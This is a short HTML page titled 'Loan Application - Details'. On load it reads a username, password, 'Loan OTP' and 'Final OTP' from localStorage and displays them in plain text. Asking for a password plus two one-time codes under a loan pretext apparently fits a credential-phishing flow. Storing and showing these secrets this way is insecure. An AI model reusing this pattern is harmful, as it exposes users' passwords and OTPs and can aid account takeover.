<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loan Application - Details</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background: #282c34;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .details {
      background: rgba(0, 0, 0, 0.7);
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      width: 300px;
    }

    h2 {
      color: #1dd1a1;
    }

    .detail-item {
      margin: 10px 0;
      font-size: 18px;
      color: #ddd;
    }
  </style>
</head>
<body>
  <div class="details">
    <h2>Submitted Details</h2>
    <div class="detail-item">
      <strong>Username: </strong><span id="display-username"></span>
    </div>
    <div class="detail-item">
      <strong>Password: </strong><span id="display-password"></span>
    </div>
    <div class="detail-item">
      <strong>Loan OTP: </strong><span id="display-loan-otp"></span>
    </div>
    <div class="detail-item">
      <strong>Final OTP: </strong><span id="display-final-otp"></span>
    </div>
  </div>

  <script>
    // Retrieve details from URL or local storage
    document.addEventListener('DOMContentLoaded', () => {
      const username = localStorage.getItem('username');
      const password = localStorage.getItem('password');
      const loanOtp = localStorage.getItem('loanOtp');
      const finalOtp = localStorage.getItem('finalOtp');

      // Display the values
      document.getElementById('display-username').textContent = username || 'N/A';
      document.getElementById('display-password').textContent = password || 'N/A';
      document.getElementById('display-loan-otp').textContent = loanOtp || 'N/A';
      document.getElementById('display-final-otp').textContent = finalOtp || 'N/A';
    });
  </script>
</body>
</html>
